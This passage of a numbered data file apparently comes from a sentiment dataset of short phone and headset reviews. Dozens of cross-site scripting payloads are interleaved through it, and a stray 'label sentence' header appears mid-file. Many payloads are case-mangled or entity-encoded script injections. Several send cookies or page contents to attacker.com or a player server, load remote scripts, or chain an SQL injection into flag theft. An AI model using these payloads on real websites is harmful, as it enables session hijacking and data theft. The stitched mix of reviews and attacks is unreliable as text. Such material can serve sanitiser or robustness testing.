39	<sCRiPT>FeTCh('htTp://X-ORaCLe-v0.nn9eD.KA0laBs.ORG/ADMIN/sEaRCh/x%27%20uNioN%20SeLECt%20flaG%20frOM%20CHAlleNGe%23').theN(_=>_.teXt()).tHEn(_=>NeW iMaGE().srC='HTtp://PlAYEr_sErvER/?'+_)</scripT>
40	<SCRIPT>CRYPTO.GENERATECRMFREQUEST('CN=0',0,0,NULL,'ALERT(1)',384,NULL,'RSA-DUAL-USE')</SCRIPT>
41	I found the product to be easy to set up and use.
42	The real killer is the volume, and of course it breaking.
43	<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
44	Think it over when you plan to own this one!This sure is the last MOTO phone for me!
45	Can't store anything but phone numbers to SIM.
46	I have to use the smallest earpieces provided, but it stays on pretty well.
47	<A AA AAA AAAA AAAAA AAAAAA AAAAAAA AAAAAAAA AAAAAAAAA AAAAAAAAAA HREF=J&#97V&#97SCRIPT&#X3A;&#97LERT(1)>CLICKME
48	<! foo="[[[inception]]"><x foo="]foo><script>alert(1)</script>">
49	&LT;DIV STYLE=\"WIDTH&#58; EXPRESSION(ALERT('XSS'));\"&GT;
50	The instructions didn't explain that a microphone jack could be used.
51	Great phone.
52	Those phones are working just fine now.
53	<SCRIPT 5-0*3+9/3=>pRoMPT(1)</scRIpT GivEAnsWERhErE=?
54	%2BADw-ScripT+aD4-ALeRT(DOcument.loCATiOn)%2bADW-/sCript%2baD4-
55	<iframe srcdoc='<script src="data:text/javascript,alert(document.domain)"></script>'></iframe>
56	<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>
57	&LT;layER Src=\"hTtP&#58;//ha&#46;ckErs&#46;Org/SCRiptleT&#46;hTmL\"&GT;&lt;/lAYeR&GT;
58	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
59	<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
60	+aciapga8-script+ad4-alert(document.location)+adw-/script+ad4apaai-
61	Linked to my phone without effort.
62	&Lt;bOdY BACkGrOuNd=\"jAVAsCrIPT&#058;ALERt('XSs')\"&gt;
63	&Lt;xss styLE=\"xss&#58;ExpResSion(aLERT('xss'))\"&Gt;
64	<MATH><A XLINK:HREF="//JSFIDDLE.NET/T846H/">CLICK
65	&lt;BGSOUND SRC=\"javascript&#058;alert('XSS');\"&gt;
66	<H1><FONT COLOR=BLUE>HELLOX WORLDSS</H1>
67	<IMG SRC= ONMOUSEOVER="ALERT('XXS')">
68	"/>'><SCRIPT SRC=HTTPS://ATTACKER.COM/EVIL.JS></SCRIPT>
69	EXp/*&lt;A STYLe='No\XsS&#58;nOXss(\"*//*\");
70	<FORM><IFRAME &#09;&#10;&#11; SRC="JAVASCRIPT&#58;ALERT(1)"&#11;&#10;&#09;;>
71	fOo<scrIpT>AleRt(DocUmEnT.CoOkie)</ScRipT>
72	&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\"&GT;
73	I would highly recommend this product.
74	<DIV DRAGGABLE="TRUE" CONTENTEDITABLE>DRAG ME</DIV><XSS ONDROP=ALERT(1) CONTENTEDITABLE>DROP HERE</XSS>
75	Worked very well paired with a Treo 7w and as a Skype headset on my PC (using a USB Bluetooth transceiver).
76	<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script><div ng-app ng-csp>{{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}</div>"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script><div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
77	<audio autoplay onplaying=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
78	Crisp and Clear.
79	If you are looking for a good quality Motorola Headset keep looking, this isn't it.
80	This product is clearly not ready for prime time, I don't care how cool it looks, if you can't tell a call is coming in it's worthless.
81	Overall, I would recommend this phone over the new Walkman.
82	&LT;IMG LOWSRC=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;
83	I love the ringtones because they are so upbeat!
84	You need two hands to operate the screen.This software interface is decade old and cannot compete with new software designs.
85	That company is a joke.
86	These are fabulous!
87	<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>
88	&lt;br size=\"&{alert('xss')}\"&gt;
89	%253cscript%253ealert(document.cookie)%253c/script%253e“><<script>alert(document.cookie);//<</script>
90	I can barely ever hear on it and am constantly saying "what?"
91	&lt;DIV STYLE=\"background-image&#58; url(javascript&#058;alert('XSS'))\"&gt;
92	<IFRAME %00 SRC="&TAB;JAVASCRIPT:PROMPT(1)&TAB;"%00>
93	Much less than the jawbone I was going to replace it with.
94	It quit working after I'd used it for about 8 months, so I just purchased another one because this is the best headset I've ever owned.
95	JAVASCRIPT:/*--></TITLE></STYLE></TEXTAREA></SCRIPT></XMP><SVG/ONLOAD='+/"/+/ONMOUSEOVER=1/+/[*/[]/+DOCUMENT.LOCATION=`//LOCALHOST/MH`//'>
96	<div style="font-family:'foo&#10;;color:red;';">LOL
97	This case has passed the one year mark and while it shows signs of wear, it is % functional.
98	When I placed my treo into the case, not only was it NOT snug, but there was A LOT of extra room on the sides.
99	foo<script>alert(document.cookie)</script>
100	Piece of trash.
101	<script>crypto.generatecrmfrequest('cn=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
102	Looks good in the picture, but this case was a huge disappointment!!
103	<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?
104	Then I had to continue pairing it periodically since it somehow kept dropping.
105	<IMG """><SCRIPT>ALERT("XSS")</SCRIPT>"\>
106	<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
107	They have been around for years and carries the highest quality of anti-glare screen protector that I have found to date.
108	<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
109	<INPUT ONFOCUS=WRITE(XSS) AUTOFOCUS>
110	<audio controls autoplay onended=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
111	<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
112	&lt;img src=\"jav&#x09;ascript&#058;alert('xss');\"&gt;
113	&lt;BODY BACKGROUND=\"javascript&#058;alert('XSS')\"&gt;
114	the worst phone from samsung...crap..... this crappy Samsung E75.. is the worst i have ever seeen.
115	%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
116	<DIV STYLE="WIDTH: EXPRESSION(ALERT('XSS'));">
117	This is infuriating.
118	"><a hREF="JaVaSCRiPT:EvaL('d=doCumENT; _ = d.CReAteeLEmENT(\'sCriPt\');_.SRc=\'//domAIN\';D.BodY.aPpendChILD(_)')">CLick Me foR aN AWeSoME tIMe</a>
119	<EMBED SRC="HTTP://CORKAMI.GOOGLECODE.COM/SVN/!SVN/BC/480/TRUNK/MISC/PDF/HELLOWORLD_JS_X.PDF">
120	<FOrm><iFRAme &#09;&#10;&#11; SrC="JavascRIpt&#58;aleRt(1)"&#11;&#10;&#09;;>
121	<script ^__^>alert(String.fromCharCode(49))</script ^__^
122	&lt;IMG src=\"jAv&#X0d;ascript&#058;alERt('Xss');\"&gT;
123	&Lt;boDY OnloAD=ALerT('xsS')&GT;
124	<svg xmlns="#"><script>alert(1)</script></svg>
125	It was horrible!.
126	<IfRAMe SRCDOc='<ScrIpt Src="Data:texT/JAvaScRIpT,ALeRt(docUMeNT.doMAiN)"></ScRiPT>'></ifrAme>
127	<svg/onload="(new image()).src='//attacker.com/'%2bdocument.documentelement.innerhtml">
128	Yet Plantronincs continues to use the same flawed charger design.
129	I great reception all the time.
130	<div style="width: expression(alert('xss'));">
131	Not worth it.
132	%22/%3E%3cBODY%20ONloAD=’documenT.WriTE(%22%3cs%22%2b%22CripT%20SRc=http://My.boX.Com/xSs.js%3E%3C/sCRiPT%3e%22)’%3e
133	xsS&#58;ex&#X2F;*xss*//*/*/PrEssIon(alERT(\"XSS\"))'&gT;
134	<input/onmouseover="javascript&colon;confirm&lpar;1&rpar;"
135	<img src= onmouseover="alert('xxs')">
136	<EmbED SrC="hTTp://CORKami.gooGLEcodE.COm/SVn/!sVN/bc/480/tRUnK/mISC/pDf/HElloWorld_jS_x.PDF">
137	&Lt;iMG SrC=\"jaV&#X0A;AsCRIPT&#058;AlERT('xss');\"&Gt;
138	I'm pleased.
139	It works fine on my Motorola 325 cellphone, and a lot better than the worn-out battery did.
140	&LT;BODY BACKGROUND=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;
141	&LT;LINK REL=\"STYLESHEET\" HREF=\"HTTP&#58;//HA&#46;CKERS&#46;ORG/XSS&#46;CSS\"&GT;
142	JaVaSCRiPT:/*--></TItlE></StYLe></texTaREA></sCRIpT></Xmp><svG/onlOAd='+/"/+/OnMoUSeOvEr=1/+/[*/[]/+document.lOcAtioN=`//lOcAlHosT/Mh`//'>
143	<diV STYle="bAcKgrOunD-iMAge:\0075\0072\006c\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
144	<Svg><sTylE>{FOnt-FAmILy&cOLon;'<IFRAme/oNlOaD=cOnfiRM(1)>'
145	This is simply the BEST bluetooth headset for sound quality!
146	</sCRIpT><iMg/*%00/sRC="WoRkSINchroMe&coloN;pRoMpT&#x28;1&#X29;"/%00*/onErrOR='eVAl(SrC)'>
147	<iframe src='data:text/html,<script defer="true" src="data:text/javascript,document.body.innerText=/hello/"></script>'></iframe>
148	<forM><iSINDex FORMAcTiOn="JAVAscRipT&cOLOn;CoNfiRm(1)"
149	<script 5-0*3+9/3=>prompt(1)</script giveanswerhere=?
150	disappointing.
151	Sprint charges for this service.
152	Worst ever.
153	&LT;BODY ONLOAD=ALERT('XSS')&GT;
154	The charger arrived within the promised timeframe, but it did not work.
155	<div draggable="true" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable>drop here</xss>
156	I highly recommend this case.
157	<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
158	<SVG/ONLOAD="(NEW IMAGE()).SRC='//ATTACKER.COM/'%2BDOCUMENT.DOCUMENTELEMENT.INNERHTML">
159	Krussel Always good.
160	Appears to actually outperform the original battery from China that came with my V325i.
161	* Comes with a strong light that you can use to light up your camera shots, and even flash SOS signals (seriously!
162	<SCRIPT ^__^>ALERT(STRING.FROMCHARCODE(49))</SCRIPT ^__^
163	&lt;layer src=\"http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html\"&gt;&lt;/layer&gt;
164	Couldn't use the unit with sunglasses, not good in Texas!
165	<inPuT/OnmOUSEover="jAvaScRipt&cOLon;ConfiRM&LPAr;1&RpaR;"
166	<svg onload="javascript:alert(123)" xmlns="#"></svg>
167	AFter the first charge kept going dead after 2 minutes.
168	The first thing that happened was that the tracking was off.
169	<iMg """><ScRIpT>alERT("XSs")</ScRIPt>"\>
170	"><A HREF="JAVASCRIPT:EVAL('D=DOCUMENT; _ = D.CREATEELEMENT(\'SCRIPT\');_.SRC=\'//DOMAIN\';D.BODY.APPENDCHILD(_)')">CLICK ME FOR AN AWESOME TIME</A>
171	<form><isindex formaction="javascript&colon;confirm(1)"
172	It's A PIECE OF CRAP!
173	<iframe src="javascript:alert('xss');"></iframe>
174	&LT;BR SIZE=\"&{ALERT('XSS')}\"&GT;
175	Poor product.
176	%2baciapga8-script%2bad4-alert%28document.location%29%2badw-%2fscript%2bad4apaai-
177	<IFRAME XMLNS="#" SRC="JAVASCRIPT:ALERT(1)"></IFRAME>
178	&lt;link rel=\"stylesheet\" href=\"javascript&#058;alert('xss');\"&gt;
179	<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"
180	<img/&#09;&#10;&#11; src=`~` onerror=prompt(1)>
181	<input onblur=write(xss) autofocus><input autofocus>
182	The tracfonewebsite is user friendly and makes it easy toactivate, etc.
183	.... Item arrived quickly and works great with my Metro PCS Samsung SCH-r45 slider phone and Sony Premium Sound in ear plugs.
184	Fantastic buy and will get again for whatever my next phone is
185	Then a few days later the a puff of smoke came out of the phone while in use.
186	I've had no trouble accessing the Internet, downloading ringtones or performing any of the functions.
187	<svg xmlns="#"><script>alert(1)</script></svg>
188	&LT;LAYER SRC=\"HTTP&#58;//HA&#46;CKERS&#46;ORG/SCRIPTLET&#46;HTML\"&GT;&LT;/LAYER&GT;
189	So anyone near you will hear part of your conversation.
190	In the span of an hour, I had two people exclaim "Whoa - is that the new phone on TV?!?
191	<script/&tab; src='https://dl.dropbox.com/u/13018058/js.js' /&tab;></script>
192	"><SCRIPT SRC=DATA:TEXT/JAVASCRIPT;BASE64,ZD1KB2N1BWVUDDSGXYA9IGQUY3JLYXRLRWXLBWVUDCGNC2NYAXB0JYK7XY5PZD0NMTKNO18UBM9UY2U9ZC5XDWVYEVNLBGVJDG9YKCDBBM9UY2VDJYKUBM9UY2U7XY5ZCMM9JY8VBG9JYWXOB3N0L20NO2QUYM9KES5HCHBLBMRDAGLSZCHFKSA=></SCRIPT>
193	<iframe %00 src="&tab;javascript:prompt(1)&tab;"%00>
194	"><script src=data:text/javascript;base64,zd1kb2n1bwvuddsgxya9igquy3jlyxrlrwxlbwvudcgnc2nyaxb0jyk7xy5pzd0nmtkno18ubm9uy2u9zc5xdwvyevnlbgvjdg9ykcdbbm9uy2vdjykubm9uy2u7xy5zcmm9jy8vbg9jywxob3n0l20no2quym9kes5hchblbmrdaglszchfksa=></script>
195	the charger worked for about a week and then completely stopped charging my phone.
196	<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">click me</a>
197	This BlueAnt Supertooth hands-free phone speaker is AWESOME.
198	<ImG Src= oNmouSEovER="alERT('XXs')">
199	<A HREF="DATA:TEXT/HTML;BLABLA,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">CLICK ME</A>
200	"/>'><script src=https://attacker.com/evil.js></script>
201	Comfortable fit - you need your headset to be comfortable for at least an hour at a time, if not for an entire day.
202	+Adw-sCRiPT+ad4-aleRT(dOCUmeNT.loCaTion)+adW-/ScRiPT+ad4-
203	Treo and T-Mobile refused to replace it again and forced me to buy another phone without any kind of upgrade discount.
204	‘; aLeRT(dOCuMENt.COoKiE); VaR foO=’
205	<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
206	&LT;LInK rEL=\"STYlESHeet\" HRef=\"httP&#58;//HA&#46;cKers&#46;ORG/xss&#46;Css\"&gt;
207	<SCRIPT/SRC=HTTPS://WWW.GOOGLE.COM/COMPLETE/SEARCH?CLIENT=CHROME&Q=HELLO&CALLBACK=ALERT></SCRIPT>
208	&LT;BGSOUND SRC=\"JAVASCRIPT&#058;ALERT('XSS');\"&GT;
209	&lt;style&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/style&gt;
210	doCUMeNT.querYsELeCtOR('Div').INNErHtml="<Iframe sRC='javasCrIPt:vAR s = dOCuMENT.CreateeleMENt(\"ScRiPt\");s.SRC = \"HTTPs://pasTebIn.coM/raw/dW5cWGK6\";DocUMEnT.boDY.aPPEndChiLD(s);'></ifRaME>";
211	<% foO><x foO="%><ScrIPT>aLeRT(123)</ScRIPT>">
212	<IFRAME SRC='DATA:TEXT/HTML,<SCRIPT DEFER="TRUE" SRC="DATA:TEXT/JAVASCRIPT,DOCUMENT.BODY.INNERTEXT=/HELLO/"></SCRIPT>'></IFRAME>
213	It dit not work most of the time with my Nokia 532.
214	<DIV STYLE="BACKGROUND-IMAGE:\0075\0072\006C\0028'\006A\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
215	label	sentence
216	It is simple to use and I li&lt;STYLE&gt;@import'http&#58;//ha&#46;ckers&#46;org/xss&#46;css';&lt;/STYLE&gt;
217	&lt;LINK REL=\"stylesheet\" HREF=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;css\"&gt;
218	foo<script>alert(document.cookie)</script>
219	<SCRIPT 5-0*3+9/3=>PROMPT(1)</SCRIPT GIVEANSWERHERE=?
220	<Div STYLE="wIdth: expRESsIon(alERT('XSs'));">
221	This does not fit the Palm Tungsten E2 and it broke the first time I tried to plug it in.
222	<IMG SRC= onmouseover="alert('xxs')">
223	<INput oNfoCus=wrIte(XSS) AuTOFoCUS>
224	So just beware.
225	<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
226	Plus, I seriously do not believe it is worth its steep price point.
227	<IFRAME NAME="ADMIN" SRC="HTTPS://BYPASSES-EVERYWHERE.CTF.INSECURITY-INSA.FR/ADMIN"></IFRAME>
228	<script/src=https://www.google.com/complete/search?client=chrome&q=hello&callback=alert></script>
229	<style>@im\port'\ja\vasc\ript:alert("xss")';</style>
230	Easy to pair with my Samsung Cell.
231	document.queryselector('div').innerhtml="<iframe src='javascript:var s = document.createelement(\"script\");s.src = \"https://pastebin.com/raw/dw5cwgk6\";document.body.appendchild(s);'></iframe>";
232	&LT;IMG DYNSRC=\"JAVASCRIPT&#058;ALERT('XSS')\"&GT;
233	<Meta HTTp-EQuiv="REFREsH" cOnteNT="0;url=JAvaScRIpT:ALert('xss');">
234	<FORM><ISINDEX FORMACTION="JAVASCRIPT&COLON;CONFIRM(1)"
235	However I needed some better instructions.
236	A pretty good product.
237	camera color balance is AWFUL.
238	<STYLE>@IM\PORT'\JA\VASC\RIPT:ALERT("XSS")';</STYLE>
239	&lt;img src=\"jav&#x0a;ascript&#058;alert('xss');\"&gt;
240	Nice Sound.
241	%253cscript%253ealert(document.cookie)%253c/script%253e“><<script>alert(document.cookie);//<</script>
242	I bought this phone as a replacement for my StarTac and have regretted it since.
243	Great Product.
244	&LT;DIV STYLE=\"BACKGROUND-IMAGE&#58; URL(JAVASCRIPT&#058;ALERT('XSS'))\"&GT;
245	<sCriPT/&tAB; SrC='htTpS://dl.dROPBOx.coM/U/13018058/JS.js' /&TAB;></SCRIPt>
246	They work about 2 weeks then break.
247	"><iframe onload="eval('d=document; _=d.createelement(\'script\');_.src=\'\/\/domain/m\';d.body.appendchild(_)')">
248	Excellent sound, battery life and inconspicuous to boot!.
249	&lT;DiV sTylE=\"baCkgrOunD-ImaGe&#58;\0075\0072\006c\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003A\0061\006C\0065\0072\0074\0028&#46;1027\0058&#46;1053\0053\0027\0029'\0029\"&GT;
250	Don't bother - go to the store.
251	<svg/onload="(new Image()).src='//attacker.com/'%2Bdocument.documentElement.innerHTML">
252	javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+document.location=`//localhost/mH`//'>
253	<body onload=alert('hellox worldss')>
254	i would advise to not purchase this item it never worked very well.
255	<iframe xmlns="#" src="javascript:alert(1)"></iframe>
256	<a href="javascript:void(0)" onmouseover=&newline;javascript:alert(1)&newline;>x</a><///style///><span %2f onmousemove='alert&lpar;1&rpar;'>span
257	<EMBEd SRC="DatA:imagE/svg+XML;bASe64,Phn2Zyb4BWXUcZpZDmc9imH0dh a6ly93D3CUdZmuB3jNLZIWMDAVC3znIIB4bWXUcz0IAhR0cDoVL3D3Dy53My5VCmCV mJAwmc9ZDmCIihHtbG5zOnHsaW5rpsJoDhRwOI8VD3d3lncZLM9YZY8xotK5l3hS aW5riIB2ZXjZaw9uPsIXLJAiihg9IJAIIhK9IJAIIHDPzHROpsIxotQiiGhlAwDodd0Imjaw IibPZd0IEhnzIJ48C2NyAXb0Ihr5cGU9iNRlEhqVZwNTyXnjCMlwdCI+YwxlcnQOilH TUYipoZwvc2NYaxb0PJwvc3ZnpG==" TypE="image/svG+Xml" ALlowSCRiPtacCEsS="ALWAYs"></EmBEd>
258	<TABLE BACKGROUND="JAVASCRIPT:ALERT('XSS')">
259	<A Aa aAa AaaA AaaAA aAAaAA AAAaaaa AaAaAaAA aAaaaAaaa aaaAAAAAAA HREF=J&#97v&#97scrIpT&#x3A;&#97LerT(1)>cLICkme
260	<img src=`%00`&NewLine; onerror=alert(1)&NewLine;
261	All the other cases I've tried normally fall apart after a few months but this one seems to be in for the long haul.
262	FOO<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>
263	A must study for anyone interested in the "worst sins" of industrial design.
264	<dIV sTyLe="bacKgroUnd-IMagE: urL(javASCRipt:aleRt('XsS'))">
265	<INPUT/ONMOUSEOVER="JAVASCRIPT&COLON;CONFIRM&LPAR;1&RPAR;"
266	&Lt;DiV StyLE=\"backGround-ImAge&#58; url(JavaScRipT&#058;ALERt('XSS'))\"&gT;
267	xss&#58;ex&#x2f;*xss*//*/*/pression(alert(\"xss\"))'&gt;
268	+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
269	Too bad you have to pay up to $$$ a month for the service!
270	<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
271	%2bacIaPGa8-scriPT%2BaD4-aLert%28dOCuMENt.LOcATIOn%29%2BADW-%2fscRIPT%2BaD4ApaAi-
272	<img/src=`%00` onerror=this.onerror=confirm(1)
273	This is a great product..... sure beats using your fingers!.
274	&LT;IMG SRC=\"JAV&#X09;ASCRIPT&#058;ALERT('XSS');\"&GT;
275	<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
276	<img src=javascript:alert(string.fromcharcode(88,83,83))>
277	Because both ears are occupied, background is not distracting at all.
278	<img src=`%00`&newline; onerror=alert(1)&newline;
279	You can't beat the price on these.
280	<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
281	<SCRiPT ^__^>ALERt(STRiNg.FROMcHARCoDE(49))</SCRIPT ^__^
282	&lt;xss style=\"xss&#58;expression(alert('xss'))\"&gt;
283	Voice Quality, Signal Strength, Dropped Calls.
284	<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a><///style///><span %2F onmousemove='alert&lpar;1&rpar;'>SPAN
285	Great bluetooth!.
286	I recommend iGo to anyone with different brand cell phones/mp3 players in the family.
287	&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
288	Good value, works fine - power via USB, car, or wall outlet.
289	%253cScRIpt%253EalERt(doCuMENt.CookIE)%253c/SCrIPt%253E“><<scRiPT>aLert(DOCumeNt.COOKIe);//<</ScRIpt>
290	<audio autoplay onloadedmetadata=alert(1)> <source src="validaudio.wav" type="audio/wav"></audio>
291	%22/%3E%3CBODY%20ONLOAD=’DOCUMENT.WRITE(%22%3CS%22%2B%22CRIPT%20SRC=HTTP://MY.BOX.COM/XSS.JS%3E%3C/SCRIPT%3E%22)’%3E
